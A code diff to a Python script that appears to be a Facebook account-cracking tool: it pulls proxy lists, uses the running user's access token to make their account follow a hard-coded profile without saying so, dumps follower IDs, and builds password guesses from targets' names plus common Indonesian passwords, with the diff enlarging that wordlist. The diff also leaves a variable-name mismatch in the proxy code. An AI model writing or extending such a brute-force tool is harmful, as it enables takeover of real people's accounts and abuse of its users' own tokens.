@@ -38,7 +38,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	proxy= requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
@@ -194,6 +194,7 @@ def bot():
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
+		
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
@@ -226,7 +227,7 @@ def menu(my_name,my_id):
 	elif _____alvino__adijaya_____ in ['2']:
 		dump_pengikut()
 	elif _____alvino__adijaya_____ in ['3']:
-		grup()
+		newxd()
 	elif _____alvino__adijaya_____ in ['4']:
 		crack_file()
 	elif _____alvino__adijaya_____ in ['5']:
@@ -659,22 +660,22 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','katasandi','bismillah']
+			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','password','amanah','hidayah','semangat','bintang','indonesia']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
 					pwv.append(frs+'123')
-					pwv.append(frs+'2005')
-					pwv.append(frs+'2004')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'2005')
-					pwv.append(frs+'2004')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
